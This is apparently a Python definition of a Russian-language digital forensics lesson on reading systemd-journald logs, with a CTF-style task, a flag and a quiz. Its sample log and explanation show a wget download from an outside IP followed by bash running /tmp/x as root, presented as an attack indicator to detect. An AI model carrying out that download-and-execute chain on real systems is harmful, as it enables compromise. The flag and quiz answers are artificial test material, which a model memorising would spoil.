    "Как устроен бинарный журнал systemd-journald, где он лежит, как его читать (journalctl -D, экспорт в JSON) и какие поля использовать для расследования.",
    dict(
        title="Практика: экспорт journald",
        toolset=["core", "grep", "strings"],
        files=["task.md", "journal_export.txt"],
        hints=[
            "Посмотри записи журнала: `cat journal_export.txt`.",
            "Найди запуск команд: `grep _COMM journal_export.txt`.",
            "Ищи метку: `grep nto journal_export.txt`.",
            "Собери ответ: `grep nto journal_export.txt > found.txt`.",
        ],
        flag="nto{j0urn4ld_b1n4ry}",
        task=("# Задача: журнал systemd\n\n"
              "`journal_export.txt` — экспорт бинарного журнала в текстовый вид.\n"
              "Найди записи о запуске процессов и метку.\n\n"
              "1. `cat journal_export.txt`.\n"
              "2. `grep _COMM journal_export.txt`.\n"
              "3. `grep nto journal_export.txt > found.txt`.\n"),
        seeds={
            "journal_export.txt": (
                "2025-05-01 08:10:00 host sshd[1001]: Accepted password for jdoe from 10.0.0.5\n"
                "2025-05-01 08:12:03 host systemd[1]: Started Session 3 of user jdoe.\n"
                "2025-05-01 09:03:20 host _COMM=wget _PID=2210 MESSAGE=download http://198.51.100.9/x\n"
                "2025-05-01 09:03:21 host _COMM=bash _PID=2211 _UID=0 MESSAGE=run /tmp/x\n"
                "2025-05-01 09:14:02 host kernel: audit: type=1105 ...\n"
                "note: journal marker nto{j0urn4ld_b1n4ry}\n"),
        },
    ),
    body=r'''
## Вопрос, с которого всё начинается

На современном Linux почти всё логируется через **systemd**, а его журнал — не текстовый
файл, а бинарная база. Ты не можешь просто `cat` её. Как её прочитать и что она даёт
следователю?

## Наш пример: журнал хоста

```
/var/log/journal/<machine-id>/system.journal
```

Это **бинарный** журнал **journald**. Файл разбит на структурированные записи: каждая имеет
поля `_PID`, `_UID`, `_COMM` (имя команды), `_EXE`, `MESSAGE` и другие. Именно поля, а не
только текст, делают журнал удобным для расследования.

## Шаг 1: почему журнал бинарный

Текстовые логи (`/var/log/syslog`) — это просто строки. journald хранит структуру: у каждой
записи есть метаданные, по которым можно фильтровать точно. Плата — формат непрозрачен для
`grep`. Зато `journalctl` умеет фильтровать по полю:

```
$ journalctl _COMM=wget --since "2025-05-01"
May 01 09:03:20 host wget[2210]: download http://198.51.100.9/x
```

Это значит: «покажи все записи, где имя команды — wget». Такой запрос по обычному логу
потребовал бы хрупкого grep.

## Шаг 2: где лежит и как читать копию

Если у тебя образ диска или копия каталога, а не живая система, указывай каталог явно:

```
$ journalctl -D /mnt/image/var/log/journal --no-pager
```

`-D` (directory) читает журнал из указанного каталога, не трогая систему. Для машин с
проблемной машиной это основной приём.

## Шаг 3: экспорт в переносимый вид

Чтобы анализировать журнал скриптами, его выгружают:

```
$ journalctl -D /mnt/image/var/log/journal -o json > journal.json
$ journalctl -D /mnt/image/var/log/journal -o export > journal.export
```

Формат `json` даёт по объекту на запись со всеми полями; `export` — построчный
key=value-формат. В нашем примере ты видишь записи с `_COMM=wget`, `_COMM=bash`, `_UID=0` —
это уже структурированные поля, готовые к фильтрации.

## Шаг 4: ключевые поля

| Поле | Что означает |
|------|--------------|
| `_PID` | идентификатор процесса |
| `_UID` | пользователь, запустивший процесс |
| `_COMM` | имя команды (wget, bash) |
| `_EXE` | полный путь исполняемого файла |
| `MESSAGE` | сам текст сообщения |
| `_SYSTEMD_UNIT` | юнит, к которому относится запись |
| `_BOOT_ID` | идентификатор загрузки |

По `_EXE` видно, откуда реально запущена команда, а по `_BOOT_ID` записи разделяются между
перезагрузками — это критично для таймлайна.

## Шаг 5: что искать

Цепочка `wget` → `bash` от `_UID=0` (как в нашем примере) — скачивание и запуск скрипта от
root. Смотри также записи `systemd` о старте юнитов: если появился новый `.service`, это
закрепление. А `_SYSTEMD_UNIT=sshd.service` с необычным IP — попытки входа. Сопоставив
`_COMM`, `_UID` и время с auditd и shell history, восстановишь полную картину.

## Что мы теперь знаем

- journald пишет бинарный структурированный журнал в `/var/log/journal/<machine-id>/`.
- Читается через `journalctl`; `-D <каталог>` — для копии/образа.
- Экспорт: `-o json` или `-o export` для анализа скриптами.
- Поля `_PID`, `_UID`, `_COMM`, `_EXE`, `MESSAGE`, `_BOOT_ID` — основа фильтрации.
- Цепочки скачивание→запуск от root и новые юниты — индикаторы атаки.

## Квиз

Проверь себя.

```quiz
- question: Где journald хранит журнал по умолчанию?
  options: ['/var/log/syslog', '/var/log/journal/<machine-id>/', '/etc/systemd/journal', '/run/log/journal.txt']
  answer: 1
  explanation: Постоянный журнал лежит в /var/log/journal/<machine-id>/system.journal.
- question: Как прочитать журнал из копии/образа, не трогая систему?
  options: ['journalctl -f', 'journalctl -D /путь/к/journal', 'cat system.journal', 'grep -r system.journal']
  answer: 1
  explanation: Флаг -D указывает каталог с журналом.
- question: Какое поле содержит полный путь исполняемого файла?
  options: ['_COMM', 'MESSAGE', '_EXE', '_PID']
  answer: 2
  explanation: _EXE — полный путь бинарника; _COMM — только имя команды.
- question: Зачем поле _BOOT_ID?
  options: ['Указывает версию ядра', 'Разделяет записи между перезагрузками', 'Задаёт уровень логирования', 'Содержит хеш записи']
  answer: 1
  explanation: _BOOT_ID позволяет отделить записи одной загрузки от другой — важно для таймлайна.
```

## Куда дальше

Мы закрыли ветку Linux-артефактов глубокого уровня. Дальше в курсе — mobile-форензика:
резервные копии iOS и Android как источник данных. Главное запомни: **journald — это
структурированный журнал; фильтруй по полям, а не по тексту**.

## Где пригодится

- DFIR на Linux: чтение системного журнала с образа.
- CTF-категория Forensics с дампом `/var/log/journal`.
- Threat hunting: поиск подозрительных команд через поля `_COMM`/`_EXE`.
''',
)
print("B10-A done")
